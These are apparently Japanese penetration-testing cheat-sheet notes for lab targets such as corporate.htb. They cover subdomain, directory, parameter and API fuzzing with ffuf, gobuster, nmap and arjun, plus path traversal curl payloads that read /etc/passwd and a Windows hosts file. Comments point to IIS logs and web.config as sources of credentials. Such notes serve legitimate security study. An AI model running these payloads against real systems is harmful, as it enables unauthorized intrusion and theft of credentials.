## サブドメイン
```sh
ffuf -u http://corporate.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:FUZZ.corporate.htb" -t 200
```

## Webページ
```sh
sudo nmap -p80 --script "http-enum" 192.168.1.1

gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt -t 5

ffuf -u http://192.168.1.1/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 5 --recursion -e .txt,.php
```

## Webパラメータ
```sh
arjun -u http://192.168.173.48/ -m GET
```
## WebAPI
```sh
# Web APIは/api_name/v1, /api_name/v2となることが多い？
cat pattern
# {GOBUSTER}/v1
# {GOBUSTER}/v2
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/big.txt -p pattern

ffuf -u http://192.168.1.1/FUZZ/v1 -w /usr/share/wordlists/dirb/big.txt -t 5
```
発見したAPIを使って権限昇格したい時 -> [[WebAPIの悪用]]

## パストラバーサル
```sh
# Linuxでは/etc/passwd, Windowsの場合はc:\windows\system32\drivers\etc\hostsで試せる
# フィルタかけてあることもあるのでURLエンコードなども試す
curl --path-as-is http://192.168.1.1/index.php?page=../../../../../../../etc/passwd
curl --path-as-is http://192.168.1.1/index.php?page=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts

# 以下を確認するといい情報があるかも
# ログ    -> C:\inetpub\logs\LogFiles\W3SVC1\
# 資格情報 -> C:\inetpub\wwwroot\web.config
```

### アップロード可能な拡張子確認
```sh
ffuf -u http://10.10.10.93/transfer.aspx -w extensions.txt -request request.txt -fw 94
```